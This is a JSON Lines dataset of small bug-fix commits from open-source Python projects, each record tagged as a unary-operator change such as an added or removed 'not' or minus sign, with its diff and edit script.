{"project": "weboob", "commit_sha": "a6c0636eb43fb72d27f2c125594a20649bd01a3c", "parent_sha": "836452bb3b8b6c819f2c9557724f58186a9c7fe2", "file_path": "weboob/backend.py", "project_url": "https://github.com/vicnet/weboob", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ class BaseBackend(object):\n             if value is None:\n                 raise BaseBackend.ConfigError('Missing parameter \"%s\" (%s)' % (name, field.description))\n \n-            if field.regexp and re.match(field.regexp, str(value)):\n+            if field.regexp and not re.match(field.regexp, str(value)):\n                 raise BaseBackend.ConfigError('Value of \"%s\" does not match regexp \"%s\"' % (name, field.regexp))\n \n             if not field.default is None:\n", "before": "if field . regexp and re . match ( field . regexp , str ( value ) ) : raise BaseBackend . ConfigError ( 'Value of \"%s\" does not match regexp \"%s\"' % ( name , field . regexp ) )", "after": "if field . regexp and not re . match ( field . regexp , str ( value ) ) : raise BaseBackend . ConfigError ( 'Value of \"%s\" does not match regexp \"%s\"' % ( name , field . regexp ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 67], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 33, 3, 67], 1]]"}
{"project": "pydead", "commit_sha": "4998ae45bea41cdaa81fe82f7a307a6316ae235b", "parent_sha": "ce6563a80f2d4fbd7dff2bd6f4948d3d0e206763", "file_path": "src/parse.py", "project_url": "https://github.com/srgypetrov/pydead", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class PyFile(ast.NodeVisitor):\n \n     def get_relpath_from_import(self, node):\n         if node.level != 0:\n-            pathlist = self.dot_path.split('.')[:node.level]\n+            pathlist = self.dot_path.split('.')[:-node.level]\n             if node.level > 1 and not pathlist:\n                 error(4, [self.path, node.lineno])\n             if node.module:\n", "before": "pathlist = self . dot_path . split ( '.' ) [ : node . level ]", "after": "pathlist = self . dot_path . split ( '.' ) [ : - node . level ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"slice\", 3, 49, 3, 60], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 50, 3, 60], 1]]"}
{"project": "w3af", "commit_sha": "8b850114dfb1e28851b78db4c23b562a373b3e94", "parent_sha": "fd37a1a5280f9406b1e7ca0a883d07261e799528", "file_path": "w3af/plugins/grep/analyze_cookies.py", "project_url": "https://github.com/stevenchen0x01/w3af", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -376,7 +376,7 @@ class analyze_cookies(GrepPlugin):\n \n         tmp = list(set([(c['cookie-string'], c.get_url()) for c in cookies]))\n         res_dict, item_idx = group_by_min_key(tmp)\n-        if not item_idx:\n+        if item_idx:\n             # Grouped by URLs\n             msg = 'The URL: \"%s\" sent these cookies:'\n         else:\n", "before": "if not item_idx : msg = 'The URL: \"%s\" sent these cookies:' else : ", "after": "if item_idx : msg = 'The URL: \"%s\" sent these cookies:' else : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 6, 14], [\"identifier:item_idx\", 3, 16, 3, 24], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 24]]]"}
{"project": "you-get", "commit_sha": "cdc5b3731ff0825685940fd16be720c24f2171e6", "parent_sha": "34121aab8f47183b57efdc46dc4c6a9e1efc1112", "file_path": "src/you_get/util/log.py", "project_url": "https://github.com/grizzlybears/you-get", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ def e(message, exit_code=None):\n     if exit_code is not None:\n         exit(exit_code)\n \n-def wtf(message, exit_code=-1):\n+def wtf(message, exit_code=1):\n     \"\"\"What a Terrible Failure!\"\"\"\n     print_log(message, RED, BOLD)\n     if exit_code is not None:\n", "before": "def wtf ( message , exit_code = - 1 ) : \"\"\"What a Terrible Failure!\"\"\" print_log ( message , RED , BOLD ) if exit_code is not None : ", "after": "def wtf ( message , exit_code = 1 ) : \"\"\"What a Terrible Failure!\"\"\" print_log ( message , RED , BOLD ) if exit_code is not None : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"default_parameter\", 3, 18, 3, 30], [\"integer:1\", 3, 29, 3, 30], 2], [\"Delete\", [\"-:-\", 3, 28, 3, 29]], [\"Delete\", [\"unary_operator\", 3, 28, 3, 30]]]"}
{"project": "qutebrowser", "commit_sha": "eeef9aa930d75153a5cd281a6643d3c3f03a8442", "parent_sha": "92ff957543b13fb8cfe7659c448be75c9a3863d4", "file_path": "qutebrowser/commands/managers.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class SearchManager(QObject):\n             self.do_search.emit('', 0)\n         self._text = text\n         self._flags = 0\n-        if config.get('general', 'ignore-case'):\n+        if not config.get('general', 'ignore-case'):\n             self._flags |= QWebPage.FindCaseSensitively\n         if config.get('general', 'wrap-search'):\n             self._flags |= QWebPage.FindWrapsAroundDocument\n", "before": "if config . get ( 'general' , 'ignore-case' ) : self . _flags |= QWebPage . FindCaseSensitively", "after": "if not config . get ( 'general' , 'ignore-case' ) : self . _flags |= QWebPage . FindCaseSensitively", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 56], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 48], 1]]"}
{"project": "qutebrowser", "commit_sha": "66e670a96bef4b24562f5a90db5ced546cedd6b7", "parent_sha": "c826db7e031418269e7957fc526648979eb2005c", "file_path": "qutebrowser/commands/runners.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,8 +75,7 @@ class SearchRunner(QObject):\n         if ignore_case == 'smart':\n             if not text.islower():\n                 self._flags |= QWebPage.FindCaseSensitively\n-        elif ignore_case:\n-            # True, but not 'smart'\n+        elif not ignore_case:\n             self._flags |= QWebPage.FindCaseSensitively\n         if config.get('general', 'wrap-search'):\n             self._flags |= QWebPage.FindWrapsAroundDocument\n", "before": "if ignore_case == 'smart' : if not text . islower ( ) : self . _flags |= QWebPage . FindCaseSensitively elif ignore_case : self . _flags |= QWebPage . FindCaseSensitively", "after": "if ignore_case == 'smart' : if not text . islower ( ) : self . _flags |= QWebPage . FindCaseSensitively elif not ignore_case : self . _flags |= QWebPage . FindCaseSensitively", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 9, 5, 56], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:ignore_case\", 3, 14, 3, 25], 1]]"}
{"project": "qutebrowser", "commit_sha": "1f4ca39e53b11c3ac7b3404aa409bf31c737e7de", "parent_sha": "2df8500792a11a65d2aad7a2089557d84184a300", "file_path": "qutebrowser/utils/editor.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class ExternalEditor(QObject):\n             raise ValueError(\"Already editing a file!\")\n         self.text = text\n         self.oshandle, self.filename = mkstemp(text=True)\n-        if not text:\n+        if text:\n             with open(self.filename, 'w') as f:\n                 f.write(text)\n         self.proc = QProcess(self)\n", "before": "if not text : with open ( self . filename , 'w' ) as f : f . write ( text )", "after": "if text : with open ( self . filename , 'w' ) as f : f . write ( text )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 5, 30], [\"identifier:text\", 3, 16, 3, 20], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 20]]]"}
{"project": "deis", "commit_sha": "29f2b406251fad0066a6f4d7bb81e18048007c5b", "parent_sha": "4bdfcb317e2054a0b299243b8e11353ffe50c4f9", "file_path": "controller/scheduler/coreos.py", "project_url": "https://github.com/robszumski/deis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ class FleetHTTPClient(object):\n                           headers=headers, body=json.dumps(body))\n         resp = self.conn.getresponse()\n         data = resp.read()\n-        if 200 <= resp.status <= 299:\n+        if not 200 <= resp.status <= 299:\n             errmsg = \"Failed to create unit: {} {} - {}\".format(\n                 resp.status, resp.reason, data)\n             raise RuntimeError(errmsg)\n", "before": "if 200 <= resp . status <= 299 : errmsg = \"Failed to create unit: {} {} - {}\" . format ( resp . status , resp . reason , data ) raise RuntimeError ( errmsg )", "after": "if not 200 <= resp . status <= 299 : errmsg = \"Failed to create unit: {} {} - {}\" . format ( resp . status , resp . reason , data ) raise RuntimeError ( errmsg )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 39], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 37], 1]]"}
{"project": "matplotlib", "commit_sha": "47e8cdb1e53aa65ec0b2f7e4419038bbedd4903c", "parent_sha": "0a7af4e1524ca7a8a83980982f19499a7a2f6697", "file_path": "lib/matplotlib/backend_managers.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -304,7 +304,7 @@ class ToolManager(object):\n             else:\n                 mod = 'backend_tools'\n                 current_module = __import__(mod,\n-                                            globals(), locals(), [mod], -1)\n+                                            globals(), locals(), [mod], 1)\n \n                 callback_class = getattr(current_module, callback_class, False)\n         if callable(callback_class):\n", "before": "current_module = __import__ ( mod , globals ( ) , locals ( ) , [ mod ] , - 1 )", "after": "current_module = __import__ ( mod , globals ( ) , locals ( ) , [ mod ] , 1 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"argument_list\", 2, 44, 3, 76], [\"integer:1\", 3, 74, 3, 75], 9], [\"Delete\", [\"-:-\", 3, 73, 3, 74]], [\"Delete\", [\"unary_operator\", 3, 73, 3, 75]]]"}
{"project": "biopython", "commit_sha": "9710335ef4a09ed34178174a04ed8bbb1d5c01f0", "parent_sha": "617d2449349437a9677f3025bb61daa736ada93f", "file_path": "Bio/NeuralNetwork/Gene/Pattern.py", "project_url": "https://github.com/paulhendricks/biopython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class PatternIO(object):\n             if self._alphabet is not None:\n                 # make single patterns (not signatures) into lists, so we\n                 # can check signatures and single patterns the same\n-                if isinstance(cur_pattern, tuple):\n+                if not isinstance(cur_pattern, tuple):\n                     test_pattern = [cur_pattern]\n                 else:\n                     test_pattern = cur_pattern\n", "before": "if isinstance ( cur_pattern , tuple ) : test_pattern = [ cur_pattern ] else : test_pattern = cur_pattern", "after": "if not isinstance ( cur_pattern , tuple ) : test_pattern = [ cur_pattern ] else : test_pattern = cur_pattern", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 47], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 50], 1]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "1baf973807213865fb7ad7f3b215b61a4c1530d9", "parent_sha": "02cb3b66e5f7b964dd303374fb00ad8e3d820158", "file_path": "chainer/variable.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ def _check_grad_type(func, x, gx):\n     if x.data is None or gx is None:\n         # ``x.data is None`` implies that the data array is not retained\n         return\n-    if isinstance(gx, type(x.data)):\n+    if not isinstance(gx, type(x.data)):\n         msg = ('Type of data and grad mismatch\\n%s != %s' %\n                (type(x.data), type(gx)))\n         typ = TypeError\n", "before": "if isinstance ( gx , type ( x . data ) ) : msg = ( 'Type of data and grad mismatch\\n%s != %s' % ( type ( x . data ) , type ( gx ) ) ) typ = TypeError", "after": "if not isinstance ( gx , type ( x . data ) ) : msg = ( 'Type of data and grad mismatch\\n%s != %s' % ( type ( x . data ) , type ( gx ) ) ) typ = TypeError", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 24], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 36], 1]]"}
{"project": "flask-cache", "commit_sha": "311eaaa7f5108c212d67ffe6dfb19484a8fe4de6", "parent_sha": "79f0b97e6efbf6803d61ce5332e73e7d8101eea0", "file_path": "flask_cache/__init__.py", "project_url": "https://github.com/dropkitchen/flask-cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -294,7 +294,7 @@ class Cache(object):\n                 arg = args[arg_num]\n                 arg_num += 1\n             else:\n-                arg = argspec.defaults[i]\n+                arg = argspec.defaults[-i]\n                 arg_num += 1\n \n             #: Attempt to convert all arguments to a\n", "before": "else : arg = argspec . defaults [ i ]", "after": "else : arg = argspec . defaults [ - i ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"subscript\", 3, 23, 3, 42], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:i\", 3, 40, 3, 41], 1]]"}
{"project": "deoplete-go", "commit_sha": "aaf1b282706de2db04ef9940d22434e442da2cef", "parent_sha": "ad7e611d51de272e21bc0b66d1d3fecef32d78a9", "file_path": "rplugin/python3/deoplete/sources/go.py", "project_url": "https://github.com/4ydx/deoplete-go", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ class Source(Base):\n                     class_dict[_class].append(candidates)\n \n             # append with sort by complete['class']\n-            if self.sort_class == []:\n+            if not self.sort_class == []:\n                 for c in self.sort_class:\n                     for x in class_dict[c]:\n                         out.append(x)\n", "before": "if self . sort_class == [ ] : for c in self . sort_class : for x in class_dict [ c ] : out . append ( x )", "after": "if not self . sort_class == [ ] : for c in self . sort_class : for x in class_dict [ c ] : out . append ( x )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 38], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 37], 1]]"}
{"project": "Solaar", "commit_sha": "358e0958bb46d6fa20ea4713b222d3d471ea23ee", "parent_sha": "fa5fba796b87fc1b8f4ce15ac828854ab87a022a", "file_path": "lib/logitech_receiver/receiver.py", "project_url": "https://github.com/mchehab/Solaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class PairedDevice(object):\n \t\t# \t_log.debug(\"new PairedDevice(%s, %s, %s)\", receiver, number, link_notification)\n \n \t\tif link_notification is not None:\n-\t\t\tself.online = bool(ord(link_notification.data[0:1]) & 0x40)\n+\t\t\tself.online = not bool(ord(link_notification.data[0:1]) & 0x40)\n \t\t\tself.wpid = _strhex(link_notification.data[2:3] + link_notification.data[1:2])\n \t\t\t# assert link_notification.address == (0x04 if unifying else 0x03)\n \t\t\tkind = ord(link_notification.data[0:1]) & 0x0F\n", "before": "self . online = bool ( ord ( link_notification . data [ 0 : 1 ] ) & 0x40 )", "after": "self . online = not bool ( ord ( link_notification . data [ 0 : 1 ] ) & 0x40 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"assignment\", 3, 4, 3, 63], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 18, 3, 63], 1]]"}
{"project": "charmhelpers", "commit_sha": "014e521b0f239b348a70b7bc00b4ec13be930466", "parent_sha": "1e6c1ff6c2d3fc0187c2367d90d84e636580bcc2", "file_path": "charmhelpers/contrib/charmsupport/nrpe.py", "project_url": "https://github.com/whitmo/charmhelpers", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ class NRPE(object):\n         super(NRPE, self).__init__()\n         self.config = config()\n         self.nagios_context = self.config['nagios_context']\n-        if 'nagios_servicegroups' in self.config and not self.config['nagios_servicegroups']:\n+        if 'nagios_servicegroups' in self.config and self.config['nagios_servicegroups']:\n             self.nagios_servicegroups = self.config['nagios_servicegroups']\n         else:\n             self.nagios_servicegroups = self.nagios_context\n", "before": "if 'nagios_servicegroups' in self . config and not self . config [ 'nagios_servicegroups' ] : self . nagios_servicegroups = self . config [ 'nagios_servicegroups' ] else : self . nagios_servicegroups = self . nagios_context", "after": "if 'nagios_servicegroups' in self . config and self . config [ 'nagios_servicegroups' ] : self . nagios_servicegroups = self . config [ 'nagios_servicegroups' ] else : self . nagios_servicegroups = self . nagios_context", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 93], [\"subscript\", 3, 58, 3, 93], 2], [\"Delete\", [\"not:not\", 3, 54, 3, 57]], [\"Delete\", [\"not_operator\", 3, 54, 3, 93]]]"}
{"project": "zmirror", "commit_sha": "9eb114c4845ff5914f7c685ea185e63fe6462bfa", "parent_sha": "98eb95050557b7f86501faf80aa969fa3bce0005", "file_path": "MagicWebsiteMirror.py", "project_url": "https://github.com/itplanes/zmirror", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1734,7 +1734,7 @@ def ip_ban_verify_page():\n             if request.form.get(str(q_id)) != _question[1]:\n                 if not human_ip_verification_answer_any_one_questions_is_ok:\n                     return generate_simple_resp_page(b'You got an error in ' + _question[0].encode(), 200)\n-            elif not human_ip_verification_answer_any_one_questions_is_ok:\n+            elif human_ip_verification_answer_any_one_questions_is_ok:\n                 break\n         else:\n             if human_ip_verification_answer_any_one_questions_is_ok:\n", "before": "if request . form . get ( str ( q_id ) ) != _question [ 1 ] : if not human_ip_verification_answer_any_one_questions_is_ok : return generate_simple_resp_page ( b'You got an error in ' + _question [ 0 ] . encode ( ) , 200 ) elif not human_ip_verification_answer_any_one_questions_is_ok : break else : if human_ip_verification_answer_any_one_questions_is_ok : ", "after": "if request . form . get ( str ( q_id ) ) != _question [ 1 ] : if not human_ip_verification_answer_any_one_questions_is_ok : return generate_simple_resp_page ( b'You got an error in ' + _question [ 0 ] . encode ( ) , 200 ) elif human_ip_verification_answer_any_one_questions_is_ok : break else : if human_ip_verification_answer_any_one_questions_is_ok : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"elif_clause\", 3, 13, 4, 22], [\"identifier:human_ip_verification_answer_any_one_questions_is_ok\", 3, 22, 3, 74], 1], [\"Delete\", [\"not:not\", 3, 18, 3, 21]], [\"Delete\", [\"not_operator\", 3, 18, 3, 74]]]"}
{"project": "SyVOLT", "commit_sha": "e828e031dd65326eb0c46d030706f029801da758", "parent_sha": "9e17813ed49c9486b7979635d5a7d367064f7879", "file_path": "util/test_script_base.py", "project_url": "https://github.com/levilucio/SyVOLT", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class Test:\n             pc_time = ts1 - ts0\n             # print(\"\\n\\nTime to build the set of path conditions: \" + str(pc_time))\n \n-            if not args.do_pickle:\n+            if args.do_pickle:\n                 save_pcs(s, self.pc_save_filename)\n \n         else:\n", "before": "if not args . do_pickle : save_pcs ( s , self . pc_save_filename ) else : ", "after": "if args . do_pickle : save_pcs ( s , self . pc_save_filename ) else : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 13, 6, 14], [\"attribute\", 3, 20, 3, 34], 1], [\"Delete\", [\"not:not\", 3, 16, 3, 19]], [\"Delete\", [\"not_operator\", 3, 16, 3, 34]]]"}
{"project": "youtube-8m", "commit_sha": "540f79d8d0fdfec428235c7c8ceff4cbee07de0b", "parent_sha": "c2f19a85056644f0a235cff447c3a0975cd2b947", "file_path": "inference.py", "project_url": "https://github.com/kevin-luc/youtube-8m", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ if __name__ == '__main__':\n def format_lines(video_ids, predictions, top_k):\n   batch_size = len(video_ids)\n   for video_index in xrange(batch_size):\n-    top_indices = numpy.argpartition(predictions[video_index], top_k)[-top_k:]\n+    top_indices = numpy.argpartition(predictions[video_index], -top_k)[-top_k:]\n     line = [(class_index, predictions[video_index][class_index])\n             for class_index in top_indices]\n     line = sorted(line, key=lambda p: -p[1])\n", "before": "top_indices = numpy . argpartition ( predictions [ video_index ] , top_k ) [ - top_k : ]", "after": "top_indices = numpy . argpartition ( predictions [ video_index ] , - top_k ) [ - top_k : ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 70], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:top_k\", 3, 64, 3, 69], 1]]"}
{"project": "ansible-modules-core", "commit_sha": "c354c974e74d79589b5d08de0365f94aaa03b309", "parent_sha": "4bd2a409e6409f703005b3ccf2603b9db19db9b0", "file_path": "database/postgresql/postgresql_db.py", "project_url": "https://github.com/jpic/ansible-modules-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -288,11 +288,11 @@ def main():\n     try:\n         if module.check_mode:\n             if state == \"absent\":\n-                changed = not db_exists(cursor, db)\n+                changed = db_exists(cursor, db)\n             elif state == \"present\":\n                 changed = not db_matches(cursor, db, owner, template, encoding,\n                                          lc_collate, lc_ctype)\n-            module.exit_json(changed=changed,db=db)\n+            module.exit_json(changed=changed, db=db)\n \n         if state == \"absent\":\n             try:\n", "before": "changed = not db_exists ( cursor , db )", "after": "changed = db_exists ( cursor , db )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"assignment\", 3, 17, 3, 52], [\"call\", 3, 31, 3, 52], 2], [\"Delete\", [\"not:not\", 3, 27, 3, 30]], [\"Delete\", [\"not_operator\", 3, 27, 3, 52]]]"}
{"project": "floris", "commit_sha": "438a1a35dac9d707aab0c25d472a26cf257204c4", "parent_sha": "ef21d5bc25b634f92603852096407aa6b6fadd9d", "file_path": "floris/simulation/wake_velocity/gaussianModels/gauss_legacy.py", "project_url": "https://github.com/NREL/floris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class LegacyGauss(VelocityDeficit):\n         a = cosd(veer)**2 / (2 * sigma_y**2) + sind(veer)**2 / (2 * sigma_z**2)\n         b = -sind(2 * veer) / (4 * sigma_y**2) + sind(2 * veer) / (4 * sigma_z**2)\n         c = sind(veer)**2 / (2 * sigma_y**2) + cosd(veer)**2 / (2 * sigma_z**2)\n-        r = -(a * ((y_locations - turbine_coord.x2) - delta)**2 - 2 * b * ((y_locations - turbine_coord.x2) - delta) * ((z_locations - HH)) + c * ((z_locations - HH))**2)\n+        r = a * ((y_locations - turbine_coord.x2) - delta)**2 - 2 * b * ((y_locations - turbine_coord.x2) - delta) * ((z_locations - HH)) + c * ((z_locations - HH))**2\n         C = 1 - np.sqrt(1 - ( Ct * cosd(yaw) / (8.0 * sigma_y * sigma_z / D**2) ) )\n \n         velDef = GaussianModel.gaussian_function(U_local, C, r, 1, np.sqrt(0.5) )\n", "before": "r = - ( a * ( ( y_locations - turbine_coord . x2 ) - delta ) ** 2 - 2 * b * ( ( y_locations - turbine_coord . x2 ) - delta ) * ( ( z_locations - HH ) ) + c * ( ( z_locations - HH ) ) ** 2 )", "after": "r = a * ( ( y_locations - turbine_coord . x2 ) - delta ) ** 2 - 2 * b * ( ( y_locations - turbine_coord . x2 ) - delta ) * ( ( z_locations - HH ) ) + c * ( ( z_locations - HH ) ) ** 2", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"assignment\", 3, 9, 3, 171], [\"binary_operator\", 3, 15, 3, 170], 2], [\"Delete\", [\"-:-\", 3, 13, 3, 14]], [\"Delete\", [\"(:(\", 3, 14, 3, 15]], [\"Delete\", [\"):)\", 3, 170, 3, 171]], [\"Delete\", [\"parenthesized_expression\", 3, 14, 3, 171]], [\"Delete\", [\"unary_operator\", 3, 13, 3, 171]]]"}
{"project": "lutris", "commit_sha": "11a46c94d2fb45549f9b34a858a26832279940af", "parent_sha": "ec58290fb5c49a55bc09bb28a64f3349b9a913bb", "file_path": "lutris/util/vulkan.py", "project_url": "https://github.com/MCOfficer/lutris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def vulkan_check():\n     for line in subprocess.check_output([\"ldconfig\", \"-p\"]).splitlines():\n         line = str(line)\n         if 'libvulkan' in line:\n-            if 'x86-64' in line:\n+            if not 'x86-64' in line:\n                 has_32_bit = True\n             else:\n                 has_64_bit = True\n", "before": "if 'x86-64' in line : has_32_bit = True else : has_64_bit = True", "after": "if not 'x86-64' in line : has_32_bit = True else : has_64_bit = True", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 34], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 32], 1]]"}
{"project": "b2share", "commit_sha": "6de95a9606d618ad08185e37a478b7b3f14d2d98", "parent_sha": "19919ba539257e6bd471e0feefdfa86144bb763f", "file_path": "modules/bibrank/lib/bibrank_downloads_grapher.py", "project_url": "https://github.com/nharraud/b2share", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ def create_download_history_graph_and_box(id_bibrec, ln=CFG_SITE_LANG):\n         id_bibdocs &= id_existing_bibdocs\n \n         history_analysis_results = ()\n-        if id_bibdocs:\n+        if not id_bibdocs:\n             pass\n         elif len(id_bibdocs) <= cfg_id_bibdoc_id_bibrec and 0 not in id_bibdocs:\n             history_analysis_results = draw_downloads_statistics(id_bibrec, list(id_bibdocs))\n", "before": "if id_bibdocs : pass elif len ( id_bibdocs ) <= cfg_id_bibdoc_id_bibrec and 0 not in id_bibdocs : history_analysis_results = draw_downloads_statistics ( id_bibrec , list ( id_bibdocs ) )", "after": "if not id_bibdocs : pass elif len ( id_bibdocs ) <= cfg_id_bibdoc_id_bibrec and 0 not in id_bibdocs : history_analysis_results = draw_downloads_statistics ( id_bibrec , list ( id_bibdocs ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 94], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:id_bibdocs\", 3, 12, 3, 22], 1]]"}
{"project": "lutris", "commit_sha": "187e99e17c8307cbb5ffcad9fa9708c01a824233", "parent_sha": "e2e4044c115d15ce7375621d2d6460ec682892d1", "file_path": "lutris/gui/lutriswindow.py", "project_url": "https://github.com/MCOfficer/lutris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -664,7 +664,7 @@ class LutrisWindow(Gtk.ApplicationWindow):\n \n     def on_game_installed(self, view, game_id):\n         \"\"\"Callback to handle newly installed games\"\"\"\n-        if isinstance(game_id, int):\n+        if not isinstance(game_id, int):\n             raise ValueError(\"game_id must be an int\")\n         if not self.view.has_game_id(game_id):\n             logger.debug(\"Adding new installed game to view (%d)\", game_id)\n", "before": "if isinstance ( game_id , int ) : raise ValueError ( \"game_id must be an int\" )", "after": "if not isinstance ( game_id , int ) : raise ValueError ( \"game_id must be an int\" )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 55], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 36], 1]]"}
{"project": "aioriak", "commit_sha": "ad9e67982437a312ba5f7fd652b8aee6ad09bed9", "parent_sha": "de12b82bc3485d9864a0ff931fcf5b3334899197", "file_path": "commands.py", "project_url": "https://github.com/Bahus/aioriak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,4 +262,4 @@ class Test(TestCommand, docker):\n         result = nose.run(argv=['nosetests'])\n         if self.use_docker():\n             self.run_command('docker_stop')\n-        sys.exit(result)\n+        sys.exit(not result)\n", "before": "sys . exit ( result )", "after": "sys . exit ( not result )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 17, 3, 25], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:result\", 3, 18, 3, 24], 1]]"}
